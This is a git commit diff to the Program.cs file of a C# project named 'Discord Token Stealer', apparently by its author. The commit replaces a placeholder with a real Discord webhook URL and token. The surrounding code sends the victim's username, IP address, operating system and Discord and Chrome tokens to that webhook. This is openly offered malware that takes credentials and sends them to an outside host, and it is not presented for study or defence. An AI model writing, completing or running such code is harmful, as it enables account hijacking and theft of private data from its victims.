0431244fa232a0eae19b034a018798fdd769e924
Konata-Izum <75105359+Konata-Izum@users.noreply.github.com>
2020-11-27 09:11:41 -0800

    Update Program.cs

--- Discord Token Stealer/Discord Token Stealer/Program.cs
+++ Discord Token Stealer/Discord Token Stealer/Program.cs
@@ -44,7 +44,7 @@ namespace Discord_Token_Stealer
                     String OSName = managementObject["Caption"].ToString();
                     dcWeb.ProfilePicture = "https://www.logolynx.com/images/logolynx/1b/1bcc0f0aefe71b2c8ce66ffe8645d365.png";
                     dcWeb.UserName = "Webhook";
-                    dcWeb.WebHook = "YOURDISCORDWEBHOOK LINK"; 
+                    dcWeb.WebHook = "https://discord.com/api/webhooks/781930148265852939/GtZa4y_mq7Zk9gvPIqwE-9LT0g7X4nhWxiNEHDUFfbsRcE48yqPJwutk4FyJ0KS0wmWT"; 
                     dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS: " + OSName + Environment.NewLine + "Token DiscordAPP: " + string2 + Environment.NewLine + "Token Chrome: " + string4 + "```");
                 }
             }
